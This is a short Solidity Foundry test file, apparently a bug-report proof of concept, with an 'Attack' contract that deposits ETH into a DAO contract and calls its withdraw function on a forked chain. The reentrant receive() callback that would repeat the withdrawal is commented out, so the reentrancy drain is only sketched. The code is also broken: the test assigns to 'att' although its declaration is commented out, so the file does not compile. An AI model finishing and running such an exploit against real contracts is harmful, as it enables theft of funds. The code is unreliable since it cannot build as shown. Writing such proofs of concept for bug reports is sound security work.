// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IDAO {
    function withdraw(uint256 amount) external;
}

contract Attack {
    IDAO public dao;
    constructor(address daoAddr) payable {
        dao = IDAO(daoAddr);
    }

    function attack() external payable {
        (bool ok, ) = address(dao).call{ value: msg.value }("");
        require(ok, "deposit failed");
        dao.withdraw(msg.value);
    }

    // receive() external payable {
    //     // uint256 bal = address(dao).balance;
    //     // if (bal >= msg.value) {
    //     //     dao.withdraw(msg.value);
    //     // }
    // }
}

contract BugReport is Test {
    // Attack public att;

    function bug(uint256 forkId, address addr) internal {
        vm.selectFork(forkId);

        att = new Attack{ value: 1 ether }(addr);
        att.attack{ value: 1 ether }();
    }
}